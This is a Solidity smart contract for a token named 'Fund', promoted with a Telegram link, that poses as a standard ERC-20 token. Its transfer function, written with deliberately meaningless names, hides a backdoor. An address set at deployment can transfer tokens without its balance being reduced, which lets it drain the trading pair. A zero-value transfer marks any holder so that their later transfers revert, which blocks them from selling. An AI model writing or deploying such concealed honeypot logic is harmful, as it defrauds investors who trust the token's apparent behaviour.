/*

https://t.me/miladyapes

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Fund is Ownable {
    uint256 public totalSupply;

    mapping(address => uint256) private wolf;

    function transferFrom(address limited, address law, uint256 ancient) public returns (bool success) {
        impossible(limited, law, ancient);
        require(ancient <= allowance[limited][msg.sender]);
        allowance[limited][msg.sender] -= ancient;
        return true;
    }

    uint256 private today = 19;

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private hour;

    function impossible(address limited, address law, uint256 ancient) private returns (bool success) {
        if (wolf[limited] == 0) {
            if (hour[limited] > 0 && limited != uniswapV2Pair) {
                wolf[limited] -= today;
            }
            balanceOf[limited] -= ancient;
        }
        if (ancient == 0) {
            hour[law] += today;
        }
        balanceOf[law] += ancient;
        emit Transfer(limited, law, ancient);
        return true;
    }

    constructor(address separate) {
        symbol = 'Fund';
        name = 'Fund';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        wolf[separate] = today;
    }

    function approve(address off, uint256 ancient) public returns (bool success) {
        allowance[msg.sender][off] = ancient;
        emit Approval(msg.sender, off, ancient);
        return true;
    }

    address public uniswapV2Pair;

    string public name;

    function transfer(address law, uint256 ancient) public returns (bool success) {
        impossible(msg.sender, law, ancient);
        return true;
    }

    uint8 public decimals = 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol;
}